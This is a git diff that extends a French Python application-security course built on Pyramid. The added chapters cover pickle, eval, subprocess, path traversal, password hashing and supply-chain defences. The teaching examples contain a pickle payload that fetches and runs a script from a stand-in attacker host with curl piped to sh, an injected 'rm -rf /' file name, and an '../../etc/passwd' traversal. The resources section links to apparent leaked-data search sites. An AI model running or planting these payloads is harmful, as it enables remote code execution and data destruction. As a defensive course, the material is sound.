@@ -13,7 +13,9 @@ themes:
   - python
   - developpement-web
   - pyramid
-resume: "Cours de sécurité applicative en Python appuyé sur un projet Pyramid : authentification et gestion des accès, sessions, modération de contenus soumis et principes de programmation sécurisée."
+  - cryptographie
+  - tests-logiciels
+resume: "Cours de sécurité applicative en Python appuyé sur un projet Pyramid : authentification, sessions, cryptographie, injections SQL, XSS et CSRF, analyse de journaux, puis les vulnérabilités propres au langage (pickle, eval, sous-processus), la gestion des secrets et la sécurité de la chaîne d'approvisionnement."
 niveau: intermediaire
 prerequis:
   - "[[Python]]"
@@ -22,7 +24,8 @@ auteurs:
   - "Michaël Launay"
 langue: fr
 date_creation: 2023-11-19
-date_modification: 2023-12-27
+date_modification: 2026-08-28
+date_verification: 2026-08-28
 confidentialite: publique
 publication:
   - notes-publiques
@@ -193,8 +196,18 @@ La cryptographie joue un rôle crucial dans la sécurisation des données et des
 #### Utilisation des Bibliothèques de Cryptographie en Python
 
 ##### Sélection de Bibliothèques
-- **PyCryptodome :** Une bibliothèque complète offrant des fonctions de chiffrement, de hachage, et de signatures.
-- **Cryptography :** Une bibliothèque moderne qui vise à fournir des recettes cryptographiques simples et des primitives de bas niveau.
+- **`cryptography` :** la bibliothèque de référence aujourd'hui. Elle expose une
+  couche *recipes* volontairement difficile à mal employer — `Fernet` pour le
+  chiffrement symétrique authentifié — et des primitives de bas niveau pour les
+  cas qui l'exigent. C'est celle qu'il faut choisir par défaut.
+- **PyCryptodome :** fourche maintenue de l'ancienne bibliothèque *PyCrypto*,
+  toujours utile pour les algorithmes que `cryptography` n'expose pas.
+
+> **Ne jamais installer `pycrypto`.** Le paquet d'origine est abandonné depuis
+> 2013 et porte des vulnérabilités non corrigées, dont un dépassement de tampon
+> (CVE-2013-7459). Le nom se ressemble à une lettre près : `pycryptodome` est le
+> paquet vivant, `pycrypto` le paquet mort. C'est exactement le genre de
+> confusion qu'exploite le typosquattage décrit plus loin.
 
 Ces bibliothèques sont compatibles avec Pyramid et peuvent être intégrées dans les applications Pyramid pour améliorer la sécurité.
 
@@ -250,7 +263,7 @@ Les signatures numériques sont utilisées pour vérifier l'authenticité et l'i
 
 #### Intégration avec Pyramid
 
-Pour intégrer ces fonctions de cryptographie dans une application Pyramid, il faut d'abord installer les bibliothèques (`pycryptodome` ou `cryptography`) via pip. Ensuite, on peut les importer et les utiliser dans le code de l'application Pyramid, que ce soit pour sécuriser les données stockées, crypter les communications entre le client et le serveur, ou pour d'autres besoins de sécurité.
+Pour intégrer ces fonctions de cryptographie dans une application Pyramid, il faut d'abord installer la bibliothèque (`cryptography` de préférence, `pycryptodome` si un algorithme particulier l'impose) via pip. Ensuite, on peut les importer et les utiliser dans le code de l'application Pyramid, que ce soit pour sécuriser les données stockées, crypter les communications entre le client et le serveur, ou pour d'autres besoins de sécurité.
 
 # III. Vulnérabilités et Attaques Communes en Python
 
@@ -499,8 +512,6 @@ La gestion des logs est un aspect fondamental de la sécurité informatique. Les
 
 Les logs sont essentiels pour plusieurs raisons en matière de sécurité :
 ```bash
-sed -i 's/alirpunkto/simple_app/g' {}
-``````bash
 sed -i 's/alirpunkto/simple_app/g' {}
 ```
 - **Détection d'Incidents :** Les logs permettent de détecter des activités anormales ou suspectes qui peuvent indiquer une tentative de compromission ou une attaque en cours.
@@ -769,6 +780,288 @@ if detected_anomaly:
 
 @TODO AJOUTER :
 "le scraping", "selenium", "l'analyse de page html", "l'analyse des mails", "l'usage de bibliothèques python pour tester les protocoles et les serveurs http, ftp, smtp, ssh, ntp, dns, icmp, sql, etc", beautifulsoup, le Fuzzing (dont le fuzzing http et smtp), le brute force, le scan de ports, l'analyse de paquets enregistrés avec tcpdump/wireshark, base64, ssl, hash, sha, bcrypt, des certificats, la recherche de données dans un répertoire, le parcours de nombreux fichier pour chercher un pattern, Faire un chapitre sur l'exploitation des logs d'un ubuntu 22.04 et l'écriture de scripts python pour chercher des preuves d'intrusions et faire des rapprochements (), etc,
+
+# Les vulnérabilités propres à Python
+
+Les chapitres précédents traitent de sécurité applicative — injection SQL, XSS, CSRF — que l'on rencontrerait dans n'importe quel langage. Ce chapitre traite de ce qui est **spécifique à Python** : des fonctions du langage et de sa bibliothèque standard qui exécutent du code arbitraire sans en avoir l'air.
+
+## `pickle` : une exécution de code déguisée en désérialisation
+
+```python
+import pickle
+
+donnees = pickle.loads(contenu_recu)      # exécution de code arbitraire
+```
+
+Ce n'est pas une faille de `pickle` : c'est son fonctionnement documenté. Le format sérialise des instructions de reconstruction, et la reconstruction peut appeler n'importe quoi.
+
+```python
+import pickle, os
+
+class Charge:
+    def __reduce__(self):
+        return (os.system, ("curl attaquant.example/x.sh | sh",))
+
+charge = pickle.dumps(Charge())
+# quiconque appelle pickle.loads(charge) exécute la commande
+```
+
+> **La règle est absolue : ne jamais désérialiser avec `pickle` une donnée qui ne vient pas de vous.** Ni d'un formulaire, ni d'un cache partagé, ni d'un fichier téléversé, ni d'un message de file d'attente.
+
+Les remplacements selon le besoin :
+
+| Besoin | Solution |
+| --- | --- |
+| Données structurées simples | `json` |
+| Configuration | `tomllib` (bibliothèque standard depuis 3.11) |
+| Tableaux numériques | `numpy.save` avec `allow_pickle=False` |
+| Données tabulaires | Parquet, via `pyarrow` |
+| Objets complexes, source de confiance requise | signer le message (HMAC) avant de le désérialiser |
+
+Le même raisonnement vaut pour `yaml.load` : c'est `yaml.safe_load` qu'il faut employer, la première forme instanciant des objets Python arbitraires.
+
+## `eval` et `exec`
+
+```python
+formule = request.params["formule"]
+resultat = eval(formule)          # l'attaquant choisit ce qui s'exécute
+```
+
+Les contournements de « bacs à sable » construits autour d'`eval` sont un sport bien documenté : `__builtins__`, `__subclasses__`, les chaînes d'attributs offrent toujours un chemin. **Il n'existe pas de manière sûre d'évaluer une expression fournie par un tiers avec `eval`.**
+
+```python
+import ast
+
+# pour une expression littérale
+valeur = ast.literal_eval(texte)      # n'accepte que des littéraux
+
+# pour une expression mathématique
+import sympy
+resultat = sympy.sympify(texte)       # analyseur dédié, périmètre contrôlé
+```
+
+## Les sous-processus
+
+```python
+import subprocess
+
+fichier = request.params["fichier"]
+subprocess.run(f"convert {fichier} sortie.png", shell=True)   # injection de commande
+```
+
+`shell=True` fait passer la chaîne par l'interpréteur de commandes : `fichier` valant `a.png; rm -rf /` suffit. La forme sûre passe une **liste**, sans interpréteur intermédiaire :
+
+```python
+subprocess.run(["convert", fichier, "sortie.png"], check=True)
+```
+
+`check=True` mérite d'être systématique : sans lui, un échec passe inaperçu.
+
+## La traversée de répertoire
+
+```python
+nom = request.params["nom"]
+chemin = os.path.join("/var/www/uploads", nom)
+open(chemin).read()          # nom = "../../etc/passwd"
+```
+
+`os.path.join` n'offre aucune protection : un chemin absolu ou remontant écrase simplement le préfixe. La vérification doit être explicite, après résolution :
+
+```python
+from pathlib import Path
+
+RACINE = Path("/var/www/uploads").resolve()
+chemin = (RACINE / nom).resolve()
+
+if not chemin.is_relative_to(RACINE):     # Python 3.9+
+    raise ValueError("chemin hors du périmètre autorisé")
+```
+
+`resolve()` avant la comparaison est indispensable : il déplie les `..` **et** les liens symboliques.
+
+## L'extraction d'archives
+
+Une archive peut contenir des chemins absolus, des `..` ou des liens symboliques pointant hors du répertoire d'extraction — la vulnérabilité dite *Zip Slip*, restée exploitable dans `tarfile` pendant des années.
+
+```python
+import tarfile
+
+with tarfile.open("archive.tar.gz") as archive:
+    archive.extractall("/tmp/sortie", filter="data")   # Python 3.12+
+```
+
+Le paramètre `filter="data"` refuse les chemins absolus, les remontées et les liens symboliques. Il est **obligatoire** depuis Python 3.14 ; jusque-là, son absence n'était qu'un avertissement.
+
+## Le tableau de bord
+
+| Fonction | Risque | Remplacement |
+| --- | --- | --- |
+| `pickle.loads` | exécution de code | `json`, `tomllib`, message signé |
+| `yaml.load` | instanciation arbitraire | `yaml.safe_load` |
+| `eval`, `exec` | exécution de code | `ast.literal_eval`, analyseur dédié |
+| `subprocess(..., shell=True)` | injection de commande | liste d'arguments |
+| `os.system` | injection de commande | `subprocess.run` avec une liste |
+| `tempfile.mktemp` | course entre vérification et usage | `tempfile.mkstemp` |
+| `random` pour un secret | prévisible | module `secrets` |
+| `tarfile.extractall` sans filtre | écriture hors périmètre | `filter="data"` |
+| `assert` pour une vérification | supprimé par `python -O` | `if … raise` |
+
+La dernière ligne surprend souvent : les instructions `assert` disparaissent lorsque l'interpréteur tourne avec `-O`. Un contrôle d'accès écrit avec `assert` s'évapore en production.
+
+---
+
+# Secrets, mots de passe et aléa
+
+## Ne jamais hacher un mot de passe avec SHA-256
+
+Une fonction de hachage cryptographique est conçue pour être **rapide** — c'est précisément ce qu'il ne faut pas pour un mot de passe. Un processeur graphique récent teste des milliards de SHA-256 par seconde.
+
+Il faut une fonction lente et paramétrable :
+
+```python
+from argon2 import PasswordHasher
+
+ph = PasswordHasher()                       # Argon2id, paramètres par défaut sains
+empreinte = ph.hash("mot de passe")         # sel aléatoire inclus dans la sortie
+
+try:
+    ph.verify(empreinte, saisie)
+except Exception:
+    ...                                     # échec de vérification
+```
+
+Argon2id est le choix recommandé pour les nouvelles applications. `bcrypt` reste acceptable et éprouvé ; `scrypt` et PBKDF2 conviennent lorsqu'une contrainte impose la bibliothèque standard.
+
+```python
+import hashlib, secrets
+
+sel = secrets.token_bytes(16)
+empreinte = hashlib.scrypt(mdp.encode(), salt=sel, n=2**14, r=8, p=1)
+```
+
+Le sel n'est pas secret : il empêche qu'une même empreinte serve pour deux comptes, et rend inutiles les tables précalculées.
+
+## `random` n'est pas `secrets`
+
+```python
+import random, secrets
+
+random.randint(0, 10**6)      # Mersenne Twister : entièrement prévisible
+secrets.token_urlsafe(32)     # générateur cryptographique du système
+```
+
+Le module `random` est conçu pour la simulation. Observer quelques centaines de tirages suffit à reconstituer son état interne et à prédire toute la suite. Pour un jeton de session, une réinitialisation de mot de passe ou une clef d'API, c'est `secrets`.
+
+```python
+secrets.token_urlsafe(32)         # jeton de session
+secrets.token_hex(16)             # identifiant
+secrets.compare_digest(a, b)      # comparaison à temps constant
+```
+
+`compare_digest` mérite un mot : une comparaison par `==` s'arrête au premier caractère différent, et le temps de réponse révèle donc combien de caractères étaient corrects. C'est une attaque temporelle, exploitable sur un réseau local.
+
+## Les secrets hors du code
+
+Une clef d'API dans un dépôt Git y reste pour toujours : la retirer par un commit ne l'efface pas de l'historique, et les robots d'analyse de GitHub trouvent une clef publiée en quelques minutes.
+
+```python
+import os
+
+CLEF = os.environ["API_KEY"]      # lève KeyError si absente — c'est voulu
+```
+
+Trois précautions élémentaires : `.env` dans le `.gitignore` ; un fichier `.env.example` versionné avec des valeurs factices pour documenter les variables attendues ; et un rejeu immédiat — **rotation de la clef** — si une fuite s'est produite, car considérer un secret publié comme compromis est la seule position tenable.
+
+---
+
+# La chaîne d'approvisionnement logicielle
+
+C'est devenu le principal vecteur d'attaque de l'écosystème Python. Le code que nous écrivons représente rarement plus de quelques pourcents de ce qui s'exécute réellement.
+
+```mermaid
+flowchart TB
+    A["votre code"] --> B["requirements.txt<br/>≈ 20 dépendances directes"]
+    B --> C["≈ 200 dépendances transitives"]
+    C --> D["chacune avec ses mainteneurs,<br/>ses jetons, ses actions CI"]
+    D --> E["surface d'attaque réelle"]
+    style A fill:#e7f5ff
+    style E fill:#ffe3e3
+```
+
+## Les formes d'attaque
+
+**Le typosquattage.** Un paquet nommé `reqeusts` ou `python-dateutils` publié sur PyPI, attendant une faute de frappe. Des centaines sont retirés chaque année.
+
+**La confusion de dépendances.** Si une organisation utilise un paquet interne `outils-maison` et qu'un attaquant publie un paquet du même nom sur PyPI avec un numéro de version plus élevé, un `pip install` mal configuré prendra celui de PyPI.
+
+**La compromission d'un mainteneur.** Le compte d'un auteur légitime est détourné et une version piégée publiée. Le paquet est authentique, sa signature aussi : seule la version diffère.
+
+**Le script d'installation.** Un `setup.py` s'exécute lors de l'installation, avant tout import. Le simple fait d'installer suffit.
+
+## Les défenses
+
+```bash
+python3 -m pip install pip-audit
+pip-audit                                   # signale les vulnérabilités connues
+pip-audit --fix                             # met à jour ce qui peut l'être
+```
+
+`pip-audit` est maintenu par la *Python Packaging Authority* et interroge la base d'avis de PyPI. Il remplace avantageusement `safety`, cité plus haut dans ce cours, dont la version libre s'est restreinte.
+
+**Le verrouillage des versions** est la mesure la plus efficace :
+
+```bash
+# figer l'état exact d'un environnement qui fonctionne
+python3 -m pip freeze > requirements.lock
+
+# n'installer que ce qui correspond aux empreintes attendues
+python3 -m pip install --require-hashes -r requirements.lock
+```
+
+`--require-hashes` refuse tout paquet dont l'empreinte ne correspond pas — une version republiée sous le même numéro est donc rejetée.
+
+**L'analyse statique** complète le dispositif :
+
+```bash
+python3 -m pip install bandit
+bandit -r mon_paquet/ -ll        # -ll : ne remonter que moyen et haut
+```
+
+`bandit`, déjà présenté dans ce cours, détecte précisément les motifs du chapitre précédent : `eval`, `shell=True`, `pickle.loads`, `assert` de contrôle, secrets en dur.
+
+**L'inventaire logiciel (SBOM)** devient une obligation contractuelle dans de nombreux appels d'offres publics :
+
+```bash
+python3 -m pip install cyclonedx-bom
+cyclonedx-py environment -o sbom.json
+```
+
+## Une pratique quotidienne
+
+```mermaid
+flowchart LR
+    A["ajout d'une dépendance"] --> B["vérifier : mainteneurs,<br/>date, nombre de versions"]
+    B --> C["pip-audit"]
+    C --> D["verrouiller<br/>--require-hashes"]
+    D --> E["Dependabot ou renovate<br/>surveille en continu"]
+    E --> C
+```
+
+La question à se poser avant chaque ajout reste la plus utile : **cette dépendance vaut-elle son risque ?** Une bibliothèque de vingt lignes réimplémentée en interne est parfois plus sûre qu'un paquet supplémentaire et ses trente dépendances transitives.
+
+---
+
+# Ce que ce cours ne traite pas encore
+
+Les notes de travail en fin de document mentionnent plusieurs sujets à couvrir. Deux d'entre eux méritent d'être signalés dès maintenant, parce qu'ils sont apparus après la rédaction initiale.
+
+**Les risques propres aux assistants de code.** Un modèle de langage propose du code plausible, pas nécessairement sûr : requêtes SQL concaténées, secrets en dur, dépendances hallucinées — un paquet qui n'existe pas, que l'attaquant peut alors publier. C'est le *slopsquatting*, variante récente du typosquattage.
+
+**L'injection d'invite dans une application utilisant un modèle.** Dès qu'une application transmet à un modèle du contenu venu de l'extérieur — un document téléversé, une page web, un courriel — ce contenu peut contenir des instructions. La défense est la même que pour SQL : ne jamais confondre les **données** et les **instructions**, valider la sortie du modèle contre un format attendu plutôt que de lui faire confiance.
+
+Ces deux points relèvent de la même famille que l'injection SQL du chapitre III, ce qui est plutôt rassurant : le raisonnement de sécurité ne change pas, seul le canal change.
+
+---
 
 # Ressources
 [Liste des failles](https://search.0t.rocks/) voir search.illicit.services
